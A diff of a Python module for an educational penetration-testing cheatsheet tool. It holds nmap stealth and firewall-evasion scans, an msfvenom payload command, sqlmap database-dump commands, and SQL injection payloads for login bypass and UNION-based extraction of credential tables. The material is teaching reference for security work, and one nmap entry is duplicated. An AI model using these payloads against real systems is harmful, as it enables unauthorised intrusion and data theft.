@@ -1,16 +1,15 @@
 """
-Command Helper module for Leegion Framework
-Comprehensive cheatsheets and command references for cybersecurity tools
+Command Helper Module for Leegion Framework
 
-Author: Leegion
-Project: Leegion Framework v2.0
-Copyright (c) 2025 Leegion. All rights reserved.
+This module provides a comprehensive command reference and cheatsheet
+for various cybersecurity tools and techniques.
 """
 
 import json
 import os
-from typing import Dict, List, Any, Optional
 from datetime import datetime
+from typing import Any, Dict, List
+
 from core.base_module import BaseModule
 from core.banner import print_module_header
 
@@ -71,7 +70,8 @@ class CommandHelper(BaseModule):
         print(f"\033[93m{'='*65}\033[0m")
         print(f"\033[96mFavorite Commands:\033[0m {favorites_count}")
         print(
-            f"\033[93m🎯 BEGINNER TIP:\033[0m Learn these commands hands-on at \033[92mtryhackme.com\033[0m"
+            "\033[93m🎯 BEGINNER TIP:\033[0m Learn these commands hands-on at "
+            "\033[92mtryhackme.com\033[0m"
         )
         print(f"\033[93m{'-'*65}\033[0m")
         print("\033[96m 1.\033[0m Tool Cheatsheets")
@@ -150,18 +150,27 @@ class CommandHelper(BaseModule):
         if results:
             print(f"\n\033[93mFound {len(results)} matching commands:\033[0m")
             for i, result in enumerate(results, 1):
-                print(f"\n\033[96m{i}. {result['tool']} - {result['category']}\033[0m")
-                print(f"   Command: \033[92m{result['command']}\033[0m")
-                print(f"   Description: {result['description']}")
+                print(
+                    f"\n\033[96m{i}. {result['tool']} - "
+                    f"{result['category']}\033[0m"
+                )
+                print(
+                    f"   Command: \033[92m{result['command']}\033[0m"
+                )
+                print(
+                    f"   Description: {result['description']}"
+                )
 
                 if i % 5 == 0 and i < len(results):
                     more = self.get_user_input(
                         "Press Enter to continue or 'q' to stop: "
                     )
-                    if more.lower() == "q":
+                    if more and more.lower() == "q":
                         break
         else:
-            self.print_warning(f"No commands found for keyword '{keyword}'")
+            self.print_warning(
+                f"No commands found for keyword '{keyword}'"
+            )
 
     def _vulnerability_references(self):
         """Display vulnerability references and exploitation techniques"""
@@ -203,16 +212,21 @@ class CommandHelper(BaseModule):
             self.print_error("Invalid category selection")
 
     def _payload_generators(self):
-        """Generate common payloads for testing"""
-        print("\nPayload generators:")
-        print("\033[96m1.\033[0m SQL Injection Payloads")
-        print("\033[96m2.\033[0m XSS Payloads")
-        print("\033[96m3.\033[0m Command Injection Payloads")
-        print("\033[96m4.\033[0m Path Traversal Payloads")
-        print("\033[96m5.\033[0m LDAP Injection Payloads")
-        print("\033[96m6.\033[0m XXE Payloads")
+        """Generate various types of payloads"""
+        print("\nPayload generator categories:")
+        categories = [
+            "SQL Injection Payloads",
+            "XSS (Cross-Site Scripting) Payloads",
+            "Command Injection Payloads",
+            "Path Traversal Payloads",
+            "LDAP Injection Payloads",
+            "XXE Payloads",
+        ]
 
-        choice = self.get_user_input("Select payload type (1-6): ")
+        for i, category in enumerate(categories, 1):
+            print(f"\033[96m{i:2d}.\033[0m {category}")
+
+        choice = self.get_user_input("Select category (1-6): ")
 
         payload_methods = {
             "1": self._generate_sql_payloads,
@@ -226,18 +240,23 @@ class CommandHelper(BaseModule):
         if choice in payload_methods:
             payload_methods[choice]()
         else:
-            self.print_error("Invalid payload type selection")
+            self.print_error("Invalid category selection")
 
     def _network_references(self):
-        """Network security references"""
-        print("\nNetwork security references:")
-        print("\033[96m1.\033[0m Port Numbers Reference")
-        print("\033[96m2.\033[0m Network Reconnaissance")
-        print("\033[96m3.\033[0m Wireless Security")
-        print("\033[96m4.\033[0m Network Protocols")
-        print("\033[96m5.\033[0m Firewall Evasion")
+        """Display network security references"""
+        print("\nNetwork reference categories:")
+        categories = [
+            "Port Numbers",
+            "Network Reconnaissance",
+            "Wireless Security",
+            "Network Protocols",
+            "Firewall Evasion",
+        ]
 
-        choice = self.get_user_input("Select reference (1-5): ")
+        for i, category in enumerate(categories, 1):
+            print(f"\033[96m{i:2d}.\033[0m {category}")
+
+        choice = self.get_user_input("Select category (1-5): ")
 
         network_methods = {
             "1": self._port_numbers_reference,
@@ -250,18 +269,23 @@ class CommandHelper(BaseModule):
         if choice in network_methods:
             network_methods[choice]()
         else:
-            self.print_error("Invalid reference selection")
+            self.print_error("Invalid category selection")
 
     def _web_application_references(self):
-        """Web application security references"""
-        print("\nWeb application security references:")
-        print("\033[96m1.\033[0m HTTP Status Codes")
-        print("\033[96m2.\033[0m HTTP Headers")
-        print("\033[96m3.\033[0m Web Shells")
-        print("\033[96m4.\033[0m Reverse Shells")
-        print("\033[96m5.\033[0m Web Fuzzing")
+        """Display web application security references"""
+        print("\nWeb application reference categories:")
+        categories = [
+            "HTTP Status Codes",
+            "HTTP Headers",
+            "Web Shells",
+            "Reverse Shells",
+            "Web Fuzzing",
+        ]
 
-        choice = self.get_user_input("Select reference (1-5): ")
+        for i, category in enumerate(categories, 1):
+            print(f"\033[96m{i:2d}.\033[0m {category}")
+
+        choice = self.get_user_input("Select category (1-5): ")
 
         web_methods = {
             "1": self._http_status_codes_reference,
@@ -274,71 +298,105 @@ class CommandHelper(BaseModule):
         if choice in web_methods:
             web_methods[choice]()
         else:
-            self.print_error("Invalid reference selection")
+            self.print_error("Invalid category selection")
 
     def _custom_command_manager(self):
         """Manage custom commands"""
-        print("\nCustom command manager:")
-        print("\033[96m1.\033[0m Add Custom Command")
-        print("\033[96m2.\033[0m View Custom Commands")
-        print("\033[96m3.\033[0m Edit Custom Command")
-        print("\033[96m4.\033[0m Delete Custom Command")
+        while True:
+            print("\nCustom Command Manager:")
+            print("\033[96m1.\033[0m Add Custom Command")
+            print("\033[96m2.\033[0m View Custom Commands")
+            print("\033[96m3.\033[0m Edit Custom Command")
+            print("\033[96m4.\033[0m Delete Custom Command")
+            print("\033[96m5.\033[0m Back to Main Menu")
 
-        choice = self.get_user_input("Select option (1-4): ")
+            choice = self.get_user_input("Select option: ")
 
-        if choice == "1":
-            self._add_custom_command()
-        elif choice == "2":
-            self._view_custom_commands()
-        elif choice == "3":
-            self._edit_custom_command()
-        elif choice == "4":
-            self._delete_custom_command()
-        else:
-            self.print_error("Invalid option")
+            if choice == "1":
+                self._add_custom_command()
+            elif choice == "2":
+                self._view_custom_commands()
+            elif choice == "3":
+                self._edit_custom_command()
+            elif choice == "4":
+                self._delete_custom_command()
+            elif choice == "5":
+                break
+            else:
+                self.print_error("Invalid selection")
 
     def _command_favorites(self):
-        """Manage favorite commands"""
-        if not self.favorites:
-            self.print_warning("No favorite commands saved")
-            return
+        """Manage command favorites"""
+        while True:
+            print("\nCommand Favorites:")
+            print(f"\033[96mTotal Favorites:\033[0m {len(self.favorites)}")
+            print("\033[96m1.\033[0m View Favorites")
+            print("\033[96m2.\033[0m Add to Favorites")
+            print("\033[96m3.\033[0m Remove from Favorites")
+            print("\033[96m4.\033[0m Clear All Favorites")
+            print("\033[96m5.\033[0m Back to Main Menu")
 
-        print(f"\n\033[93m{'FAVORITE COMMANDS'.center(60)}\033[0m")
-        print(f"\033[93m{'-'*60}\033[0m")
+            choice = self.get_user_input("Select option: ")
 
-        for i, favorite in enumerate(sorted(self.favorites), 1):
-            print(f"\033[96m{i:2d}.\033[0m {favorite}")
-
-        print("\nOptions:")
-        print("1. Remove favorite")
-        print("2. Clear all favorites")
-
-        choice = self.get_user_input("Select option (1-2) or press Enter to continue: ")
-
-        if choice == "1":
-            fav_num = self.get_user_input("Enter favorite number to remove: ")
-            if fav_num and fav_num.isdigit():
-                fav_list = sorted(self.favorites)
-                idx = int(fav_num) - 1
-                if 0 <= idx < len(fav_list):
-                    self.favorites.remove(fav_list[idx])
-                    self.print_success("Favorite removed")
-        elif choice == "2":
-            confirm = self.get_user_input("Clear all favorites? (y/N): ")
-            if confirm.lower() == "y":
-                self.favorites.clear()
-                self.print_success("All favorites cleared")
+            if choice == "1":
+                if self.favorites:
+                    print("\nFavorite Commands:")
+                    for i, fav in enumerate(sorted(self.favorites), 1):
+                        print(f"\033[96m{i}.\033[0m {fav}")
+                else:
+                    self.print_info("No favorite commands yet")
+            elif choice == "2":
+                command = self.get_user_input("Enter command to add: ")
+                if command:
+                    self.favorites.add(command)
+                    self.print_success(f"Added '{command}' to favorites")
+            elif choice == "3":
+                if self.favorites:
+                    print("\nCurrent favorites:")
+                    for i, fav in enumerate(sorted(self.favorites), 1):
+                        print(f"\033[96m{i}.\033[0m {fav}")
+                    try:
+                        user_input = self.get_user_input("Enter number to remove: ")
+                        if user_input is None:
+                            continue
+                        idx = int(user_input) - 1
+                        fav_list = sorted(self.favorites)
+                        if 0 <= idx < len(fav_list):
+                            removed = fav_list[idx]
+                            self.favorites.remove(removed)
+                            self.print_success(f"Removed '{removed}' from favorites")
+                        else:
+                            self.print_error("Invalid number")
+                    except ValueError:
+                        self.print_error("Please enter a valid number")
+                else:
+                    self.print_info("No favorites to remove")
+            elif choice == "4":
+                if self.favorites:
+                    self.favorites.clear()
+                    self.print_success("All favorites cleared")
+                else:
+                    self.print_info("No favorites to clear")
+            elif choice == "5":
+                break
+            else:
+                self.print_error("Invalid selection")
 
     def _quick_reference_cards(self):
         """Display quick reference cards"""
-        print("\nQuick reference cards:")
-        print("\033[96m1.\033[0m Linux Commands")
-        print("\033[96m2.\033[0m Windows Commands")
-        print("\033[96m3.\033[0m PowerShell Commands")
-        print("\033[96m4.\033[0m Bash Scripting")
-        print("\033[96m5.\033[0m Regular Expressions")
+        print("\nQuick Reference Cards:")
+        categories = [
+            "Linux Commands",
+            "Windows Commands",
+            "PowerShell Commands",
+            "Bash Scripting",
+            "Regular Expressions",
+        ]
 
-        choice = self.get_user_input("Select reference card (1-5): ")
+        for i, category in enumerate(categories, 1):
+            print(f"\033[96m{i:2d}.\033[0m {category}")
+
+        choice = self.get_user_input("Select category (1-5): ")
 
         card_methods = {
             "1": self._linux_commands_card,
@@ -351,180 +409,179 @@ class CommandHelper(BaseModule):
         if choice in card_methods:
             card_methods[choice]()
         else:
-            self.print_error("Invalid reference card selection")
+            self.print_error("Invalid category selection")
 
     def _export_cheatsheets(self):
-        """Export cheatsheets to files"""
-        print("\nExport options:")
-        print("1. Export all cheatsheets to JSON")
-        print("2. Export custom commands")
-        print("3. Export favorites")
-        print("4. Create PDF cheatsheet")
+        """Export cheatsheets to various formats"""
+        print("\nExport Cheatsheets:")
+        print("\033[96m1.\033[0m Export to JSON")
+        print("\033[96m2.\033[0m Export to PDF")
+        print("\033[96m3.\033[0m Export to HTML")
+        print("\033[96m4.\033[0m Back to Main Menu")
 
-        choice = self.get_user_input("Select export option (1-4): ")
+        choice = self.get_user_input("Select option: ")
 
-        try:
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            output_dir = self.config.get("output_dir", "./reports/output")
-
-            if choice == "1":
-                self._export_all_cheatsheets_json(output_dir, timestamp)
-            elif choice == "2":
-                self._export_custom_commands(output_dir, timestamp)
-            elif choice == "3":
-                self._export_favorites(output_dir, timestamp)
-            elif choice == "4":
-                self._create_pdf_cheatsheet(output_dir, timestamp)
-            else:
-                self.print_error("Invalid export option")
-
-        except Exception as e:
-            self.print_error(f"Export failed: {e}")
+        if choice == "1":
+            self._export_all_cheatsheets_json("./exports", "cheatsheets")
+        elif choice == "2":
+            self._create_pdf_cheatsheet("./exports", "cheatsheets")
+        elif choice == "3":
+            html_content = self._generate_comprehensive_cheatsheet_html()
+            with open("./exports/cheatsheets.html", "w") as f:
+                f.write(html_content)
+            self.print_success("HTML cheatsheet exported to ./exports/cheatsheets.html")
+        elif choice == "4":
+            return
+        else:
+            self.print_error("Invalid selection")
 
     # Tool-specific cheatsheet methods
     def _nmap_cheatsheet(self):
         """Enhanced Nmap cheatsheet with educational descriptions"""
-        print(f"\n\033[93m{'NMAP CHEATSHEET & EDUCATIONAL GUIDE'.center(80)}\033[0m")
+        title = "NMAP CHEATSHEET & EDUCATIONAL GUIDE"
+        print(f"\n\033[93m{title.center(80)}\033[0m")
         print(f"\033[93m{'='*80}\033[0m")
 
-        print(f"\n\033[96m📚 WHAT IS NMAP?\033[0m")
+        print("\n\033[96m📚 WHAT IS NMAP?\033[0m")
         print(
-            "Nmap (Network Mapper) is a powerful network discovery and security auditing tool."
+            "Nmap (Network Mapper) is a powerful network discovery and "
+            "security auditing tool."
         )
         print(
-            "It's used to discover hosts, services, and gather information about network targets."
+            "It's used to discover hosts, services, and gather information "
+            "about network targets."
         )
 
         enhanced_commands = {
             "🎯 Basic Scans (Perfect for Beginners)": [
                 (
                     "nmap 192.168.1.1",
-                    "Basic port scan - scans top 1000 most common ports\n"
-                    + "   Best for: Initial reconnaissance of a single target\n"
-                    + "   Speed: Fast | Stealth: Medium | Info: Basic port states\n"
-                    + "   Example: nmap google.com (finds web servers, mail servers)\n"
-                    + "   Real scenario: CTF box discovery, network asset inventory",
+                    ("Basic port scan - scans top 1000 most common ports\n"
+                     "   Best for: Initial reconnaissance of a single target\n"
+                     "   Speed: Fast | Stealth: Medium | Info: Basic port "
+                     "states\n"
+                     "   Example: nmap google.com (finds web servers, "
+                     "mail servers)\n"
+                     "   Real scenario: CTF box discovery, network asset "
+                     "inventory"),
                 ),
                 (
                     "nmap -sn 192.168.1.0/24",
-                    "Ping scan (host discovery) - finds live hosts without port scanning\n"
-                    + "   Best for: Discovering which hosts are online in a network\n"
-                    + "   Example: nmap -sn 192.168.1.0/24 → finds 192.168.1.1, 192.168.1.100, etc.\n"
-                    + "   Real scenario: Home network audit, office network mapping",
+                    ("Ping scan (host discovery) - finds live hosts without "
+                     "port scanning\n"
+                     "   Best for: Discovering which hosts are online in a "
+                     "network\n"
+                     "   Example: nmap -sn 192.168.1.0/24 → finds\n"
+                     "           192.168.1.1, 192.168.1.100, etc.\n"
+                     "   Real scenario: Home network audit, office network "
+                     "mapping"),
                 ),
                 (
                     "nmap -sS 192.168.1.1",
-                    "SYN stealth scan - sends SYN packets without completing handshake\n"
-                    + "   Best for: Stealthy reconnaissance, avoiding logs\n"
-                    + "   How it works: Sends TCP SYN → receives SYN-ACK → sends RST\n"
-                    + "   Example: nmap -sS target.com (quieter than full connection)\n"
-                    + "   Real scenario: Penetration testing, avoiding IDS detection",
+                    ("SYN stealth scan - sends SYN packets without completing "
+                     "handshake\n"
+                     "   Best for: Stealthy reconnaissance, avoiding logs\n"
+                     "   How it works: Sends TCP SYN → receives SYN-ACK → "
+                     "sends RST\n"
+                     "   Example: nmap -sS target.com (quieter than full "
+                     "connection)\n"
+                     "   Real scenario: Penetration testing, avoiding IDS "
+                     "detection"),
                 ),
                 (
                     "nmap -sT 192.168.1.1",
-                    "TCP connect scan - completes full TCP handshake\n"
-                    + "   Best for: When you don't have administrator/root privileges\n"
-                    + "   Trade-off: More reliable but easier to detect and log\n"
-                    + "   Example: nmap -sT hackthebox.eu (works without sudo)\n"
-                    + "   Real scenario: Scanning from shared hosting, limited user accounts",
+                    ("TCP connect scan - completes full TCP handshake\n"
+                     "   Best for: When you don't have administrator/root "
+                     "privileges\n"
+                     "   Trade-off: More reliable but easier to detect and "
+                     "log\n"
+                     "   Example: nmap -sT hackthebox.eu (works without "
+                     "sudo)\n"
+                     "   Real scenario: Scanning from shared hosting, limited "
+                     "user accounts"),
+                ),
+                (
+                    "nmap -p 1-1000 192.168.1.1",
+                    ("Scan first 1000 ports (covers most common services)\n"
+                     "   Best for: Comprehensive but not exhaustive scanning\n"
+                     "   Speed: Medium | Coverage: High for standard "
+                     "services"),
+                ),
+                (
+                    "nmap --top-ports 100 192.168.1.1",
+                    ("Scan the 100 most commonly used ports\n"
+                     "   Best for: Quick reconnaissance with excellent "
+                     "coverage\n"
+                     "   Efficiency: Finds 90% of services in minimal time"),
+                ),
+                (
+                    "nmap -A 192.168.1.1",
+                    ("Aggressive scan: OS + version detection + default "
+                     "scripts\n"
+                     "   Best for: Maximum information in one command\n"
+                     "   ⚠️ WARNING: Very noisy, easily detected by security "
+                     "systems"),
                 ),
             ],
             "🎯 Smart Port Selection": [
                 (
                     "nmap -p 22,80,443 192.168.1.1",
-                    "Scan critical ports: SSH (22), HTTP (80), HTTPS (443)\n"
-                    + "   Best for: Quick check of essential services\n"
-                    + "   Use case: Web servers, remote access verification",
-                ),
-                (
-                    "nmap -p 1-1000 192.168.1.1",
-                    "Scan first 1000 ports (covers most common services)\n"
-                    + "   Best for: Comprehensive but not exhaustive scanning\n"
-                    + "   Speed: Medium | Coverage: High for standard services",
-                ),
-                (
-                    "nmap --top-ports 100 192.168.1.1",
-                    "Scan the 100 most commonly used ports\n"
-                    + "   Best for: Quick reconnaissance with excellent coverage\n"
-                    + "   Efficiency: Finds 90% of services in minimal time",
+                    ("Scan critical ports: SSH (22), HTTP (80), HTTPS (443)\n"
+                     "   Best for: Quick check of essential services\n"
+                     "   Use case: Web servers, remote access verification"),
                 ),
                 (
                     "nmap -p- 192.168.1.1",
-                    "Scan ALL 65535 ports (comprehensive but slow)\n"
-                    + "   Best for: CTF challenges, complete discovery\n"
-                    + "   ⚠️ WARNING: Very slow (hours), may trigger security alerts",
-                ),
-            ],
-            "🔍 Information Gathering": [
-                (
-                    "nmap -sV 192.168.1.1",
-                    "Service version detection - identifies software versions\n"
-                    + "   Discovers: Apache 2.4.41, OpenSSH 7.4, MySQL 5.7.3\n"
-                    + "   Best for: Vulnerability research, understanding target environment",
+                    ("Scan ALL 65535 ports (comprehensive but slow)\n"
+                     "   Best for: CTF challenges, complete discovery\n"
+                     "   ⚠️ WARNING: Very slow (hours), may trigger security "
+                     "alerts"),
                 ),
                 (
                     "nmap -O 192.168.1.1",
-                    "Operating system detection - identifies target OS\n"
-                    + "   Discovers: Windows 10, Ubuntu 20.04, CentOS 7\n"
-                    + "   How: Analyzes TCP/IP stack behavior patterns",
-                ),
-                (
-                    "nmap -A 192.168.1.1",
-                    "Aggressive scan: OS + version detection + default scripts\n"
-                    + "   Best for: Maximum information in one command\n"
-                    + "   ⚠️ WARNING: Very noisy, easily detected by security systems",
-                ),
-                (
-                    "nmap --script vuln 192.168.1.1",
-                    "Vulnerability detection scripts - finds known security issues\n"
-                    + "   Discovers: CVE numbers, misconfigurations, weak settings\n"
-                    + "   ⚠️ Use carefully: May trigger alerts or crash services",
-                ),
-            ],
-            "⚡ Speed vs Stealth Balance": [
-                (
-                    "nmap -T1 192.168.1.1",
-                    "Sneaky timing - very slow but hard to detect\n"
-                    + "   Best for: Avoiding IDS/IPS detection\n"
-                    + "   Speed: Very slow (hours) | Detection risk: Minimal",
-                ),
-                (
-                    "nmap -T3 192.168.1.1",
-                    "Normal timing - default balanced approach\n"
-                    + "   Best for: Most situations, good speed/stealth compromise\n"
-                    + "   Speed: Medium | Detection risk: Low-Medium",
-                ),
-                (
-                    "nmap -T4 192.168.1.1",
-                    "Aggressive timing - faster but more detectable\n"
-                    + "   Best for: Internal networks, time-sensitive scanning\n"
-                    + "   Speed: Fast | Detection risk: Medium-High",
+                    ("Operating system detection - identifies target OS\n"
+                     "   Discovers: Windows 10, Ubuntu 20.04, CentOS 7\n"
+                     "   How: Analyzes TCP/IP stack behavior patterns"),
                 ),
                 (
                     "nmap -f 192.168.1.1",
-                    "Fragment packets to evade simple firewalls\n"
-                    + "   Best for: Bypassing basic packet filtering\n"
-                    + "   How: Splits scan packets into smaller fragments",
+                    ("Fragment packets to evade simple firewalls\n"
+                     "   Best for: Bypassing basic packet filtering\n"
+                     "   How: Splits scan packets into smaller fragments"),
+                ),
+                (
+                    "nmap -T4 192.168.1.1",
+                    ("Aggressive timing - faster but more detectable\n"
+                     "   Best for: Internal networks, time-sensitive scanning\n"
+                     "   Speed: Fast | Detection risk: Medium-High"),
+                ),
+                (
+                    "nmap -f 192.168.1.1",
+                    ("Fragment packets to evade simple firewalls\n"
+                     "   Best for: Bypassing basic packet filtering\n"
+                     "   How: Splits scan packets into smaller fragments"),
                 ),
             ],
             "💾 Saving Your Results": [
                 (
                     "nmap -oN scan_results.txt 192.168.1.1",
-                    "Save human-readable output to text file\n"
-                    + "   Best for: Reading results later, including in reports\n"
-                    + "   Format: Same as what you see on screen",
+                    ("Save human-readable output to text file\n"
+                     "   Best for: Reading results later, including in "
+                     "reports\n"
+                     "   Format: Same as what you see on screen"),
                 ),
                 (
                     "nmap -oX scan_results.xml 192.168.1.1",
-                    "Save XML output for automated processing\n"
-                    + "   Best for: Importing into other security tools\n"
-                    + "   Compatible with: Metasploit, Nessus, custom scripts",
+                    ("Save XML output for automated processing\n"
+                     "   Best for: Importing into other security tools\n"
+                     "   Compatible with: Metasploit, Nessus, custom scripts"),
                 ),
                 (
                     "nmap -oA complete_scan 192.168.1.1",
-                    "Save in ALL formats (.nmap, .xml, .gnmap)\n"
-                    + "   Best for: Comprehensive documentation\n"
-                    + "   Creates: 3 files with different formats for various uses",
+                    ("Save in ALL formats (.nmap, .xml, .gnmap)\n"
+                     "   Best for: Comprehensive documentation\n"
+                     "   Creates: 3 files with different formats for various "
+                     "uses"),
                 ),
             ],
         }
@@ -534,23 +591,34 @@ class CommandHelper(BaseModule):
             print("-" * len(category.encode("ascii", "ignore")))
 
             for i, (command, description) in enumerate(command_list, 1):
-                print(f"\n\033[94m{i}. Command:\033[0m \033[92m{command}\033[0m")
+                print(
+                    f"\n\033[94m{i}. Command:\033[0m \033[92m{command}\033[0m"
+                )
                 print(f"\033[93m   {description}\033[0m")
 
-        print(f"\n\033[96m🎓 BEGINNER'S SCANNING STRATEGY:\033[0m")
+        print("\n\033[96m🎓 BEGINNER'S SCANNING STRATEGY:\033[0m")
         print("1. START: nmap -T3 192.168.1.1 (basic scan)")
-        print("2. DISCOVER: nmap -sV -p <found_ports> 192.168.1.1 (version detection)")
+        print(
+            "2. DISCOVER: nmap -sV -p <found_ports> 192.168.1.1 "
+            "(version detection)"
+        )
         print("3. WEB CHECK: nmap --script http-enum -p 80,443 192.168.1.1")
         print("4. VULNERABILITY: nmap --script vuln -p <ports> 192.168.1.1")
         print("5. DOCUMENT: nmap -oA final_scan 192.168.1.1")
 
-        print(f"\n\033[91m⚠️  CRITICAL LEGAL WARNINGS:\033[0m")
-        print("• Only scan networks you own or have explicit written permission")
-        print("• Port scanning without permission is illegal in many jurisdictions")
+        print("\n\033[91m⚠️  CRITICAL LEGAL WARNINGS:\033[0m")
+        print(
+            "• Only scan networks you own or have explicit written "
+            "permission"
+        )
+        print(
+            "• Port scanning without permission is illegal in many "
+            "jurisdictions"
+        )
         print("• Aggressive scans can crash services and cause downtime")
         print("• Always get authorization before testing production systems")
 
-        print(f"\n\033[96m💡 PRACTICAL EXAMPLES:\033[0m")
+        print("\n\033[96m💡 PRACTICAL EXAMPLES:\033[0m")
         print("• Home network discovery: nmap -sn 192.168.1.0/24")
         print("• Quick web server check: nmap -p 80,443 example.com")
         print("• Comprehensive host scan: nmap -A -T3 192.168.1.100")
@@ -587,7 +655,8 @@ class CommandHelper(BaseModule):
                 ("show payloads", "Show compatible payloads"),
                 ("generate -f exe -o payload.exe", "Generate standalone payload"),
                 (
-                    "msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f exe > payload.exe",
+                    ("msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f exe > "
+                     "payload.exe"),
                     "Generate with msfvenom",
                 ),
             ],
@@ -645,14 +714,17 @@ class CommandHelper(BaseModule):
                 ("sqlmap -u '<url>'", "Basic SQL injection test"),
                 ("sqlmap -u '<url>' --dbs", "Enumerate databases"),
                 ("sqlmap -u '<url>' -D <db> --tables", "Enumerate tables"),
-                ("sqlmap -u '<url>' -D <db> -T <table> --columns", "Enumerate columns"),
-                ("sqlmap -u '<url>' -D <db> -T <table> -C <col> --dump", "Dump data"),
+                ("sqlmap -u '<url>' -D <db> -T <table> --columns",
+                 "Enumerate columns"),
+                ("sqlmap -u '<url>' -D <db> -T <table> -C <col> --dump",
+                 "Dump data"),
             ],
             "Request Options": [
                 ("--cookie='JSESSIONID=...'", "Use cookies"),
                 ("--user-agent='...'", "Custom user agent"),
                 ("--referer='...'", "Custom referer"),
-                ("--headers='X-Forwarded-For: 127.0.0.1'", "Custom headers"),
+                ("--headers='X-Forwarded-For: 127.0.0.1'",
+                 "Custom headers"),
                 ("--method=POST", "Use POST method"),
                 ("--data='param=value'", "POST data"),
             ],
@@ -682,141 +754,150 @@ class CommandHelper(BaseModule):
         )
         print(f"\033[93m{'='*80}\033[0m")
 
-        print(f"\n\033[96m📚 WHAT IS SQL INJECTION?\033[0m")
+        print("\n\033[96m📚 WHAT IS SQL INJECTION?\033[0m")
         print(
-            "SQL injection occurs when user input is not properly sanitized before being"
-        )
-        print(
-            "used in SQL queries, allowing attackers to manipulate database operations."
+            "SQL injection occurs when user input is not properly sanitized "
+            "before being used in SQL queries, allowing attackers to manipulate "
+            "database operations."
         )
 
         payloads_with_descriptions = {
             "🎯 Basic Authentication Bypass": [
                 (
                     "' OR '1'='1",
-                    "Classic bypass - makes condition always true\n"
-                    + "   Use: Login forms, search boxes\n"
-                    + "   How: Breaks out of quotes and adds always-true condition\n"
-                    + "   Example: Username: admin' OR '1'='1 | Password: anything\n"
-                    + "   Real scenario: Admin panels, customer portals, database interfaces",
+                    ("Classic bypass - makes condition always true\n"
+                     "   Use: Login forms, search boxes\n"
+                     "   How: Breaks out of quotes and adds always-true condition\n"
+                     "   Example: Username: admin' OR '1'='1 | Password: anything\n"
+                     "   Real scenario: Admin panels, customer portals, "
+                     "database interfaces"),
                 ),
                 (
                     "' OR 1=1--",
-                    "Same as above but uses SQL comment (--) to ignore rest\n"
-                    + "   Use: When there's additional SQL code after injection point\n"
-                    + "   How: Comments out password check or other conditions\n"
-                    + "   Example: Login query becomes: WHERE user='admin' OR 1=1-- AND pass='...\n"
-                    + "   Real scenario: Legacy applications, custom authentication systems",
+                    ("Same as above but uses SQL comment (--) to ignore rest\n"
+                     "   Use: When there's additional SQL code after injection point\n"
+                     "   How: Comments out password check or other conditions\n"
+                     "   Example: Login query becomes: WHERE user='admin' OR 1=1-- "
+                     "AND pass='...\n"
+                     "   Real scenario: Legacy applications, custom authentication "
+                     "systems"),
                 ),
                 (
                     "admin'--",
-                    "Assumes username 'admin' exists, ignores password\n"
-                    + "   Use: When you know a valid username\n"
-                    + "   How: Closes username quote and comments out password check\n"
-                    + "   Example: Username: admin'-- | Password: (ignored)\n"
-                    + "   Real scenario: WordPress admin, CMS backends, database tools",
+                    ("Assumes username 'admin' exists, ignores password\n"
+                     "   Use: When you know a valid username\n"
+                     "   How: Closes username quote and comments out password check\n"
+                     "   Example: Username: admin'-- | Password: (ignored)\n"
+                     "   Real scenario: WordPress admin, CMS backends, database tools"),
                 ),
                 (
                     "') OR '1'='1",
-                    "For queries using parentheses around conditions\n"
-                    + "   Use: When original query has complex WHERE clauses\n"
-                    + "   How: Closes parentheses before adding bypass condition\n"
-                    + "   Example: WHERE (username='user' AND active=1) becomes (username='user') OR '1'='1\n"
-                    + "   Real scenario: Enterprise applications, multi-condition authentication",
+                    ("For queries using parentheses around conditions\n"
+                     "   Use: When original query has complex WHERE clauses\n"
+                     "   How: Closes parentheses before adding bypass condition\n"
+                     "   Example: WHERE (username='user' AND active=1) becomes "
+                     "(username='user') OR '1'='1\n"
+                     "   Real scenario: Enterprise applications, multi-condition "
+                     "authentication"),
                 ),
             ],
             "🔍 Union-Based SQL Injection (Data Extraction)": [
                 (
                     "' UNION SELECT 1,2,3--",
-                    "Determines number of columns in original query\n"
-                    + "   Use: First step in UNION attacks\n"
-                    + "   How: Tests if 3 columns exist; adjust numbers until no error\n"
-                    + "   Example: Search box → product' UNION SELECT 1,2,3-- \n"
-                    + "   Real scenario: E-commerce product search, news article lookup",
+                    ("Determines number of columns in original query\n"
+                     "   Use: First step in UNION attacks\n"
+                     "   How: Tests if 3 columns exist; adjust numbers until no error\n"
+                     "   Example: Search box → product' UNION SELECT 1,2,3-- \n"
+                     "   Real scenario: E-commerce product search, news article lookup"),
                 ),
                 (
                     "' UNION SELECT user(),database(),version()--",
-                    "Extracts database username, name, and version\n"
-                    + "   Use: Gathering system information\n"
-                    + "   How: Uses MySQL functions to get server details\n"
-                    + "   Example: Returns → root@localhost, shop_db, MySQL 5.7.3\n"
-                    + "   Real scenario: Fingerprinting database for targeted attacks",
+                    ("Extracts database username, name, and version\n"
+                     "   Use: Gathering system information\n"
+                     "   How: Uses MySQL functions to get server details\n"
+                     "   Example: Returns → root@localhost, shop_db, MySQL 5.7.3\n"
+                     "   Real scenario: Fingerprinting database for targeted attacks"),
                 ),
                 (
-                    "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--",
-                    "Lists all table names in the database\n"
-                    + "   Use: Finding interesting tables to target\n"
-                    + "   How: Queries information_schema (MySQL's metadata tables)\n"
-                    + "   Example: Returns → users,orders,products,admin_logs,payment_info\n"
-                    + "   Real scenario: Finding sensitive data tables like credit cards",
+                    ("' UNION SELECT 1,group_concat(table_name),3 FROM "
+                     "information_schema.tables--"),
+                    ("Lists all table names in the database\n"
+                     "   Use: Finding interesting tables to target\n"
+                     "   How: Queries information_schema (MySQL's metadata tables)\n"
+                     "   Example: Returns → users,orders,products,admin_logs,"
+                     "payment_info\n"
+                     "   Real scenario: Finding sensitive data tables like credit "
+                     "cards"),
                 ),
                 (
-                    "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
-                    "Lists column names in 'users' table\n"
-                    + "   Use: Finding username/password column names\n"
-                    + "   How: Targets specific table to understand its structure\n"
-                    + "   Example: Returns → id,username,email,password_hash,is_admin\n"
-                    + "   Real scenario: Preparing to extract user credentials",
+                    ("' UNION SELECT 1,group_concat(column_name),3 FROM "
+                     "information_schema.columns WHERE table_name='users'--"),
+                    ("Lists column names in 'users' table\n"
+                     "   Use: Finding username/password column names\n"
+                     "   How: Targets specific table to understand its structure\n"
+                     "   Example: Returns → id,username,email,password_hash,is_admin\n"
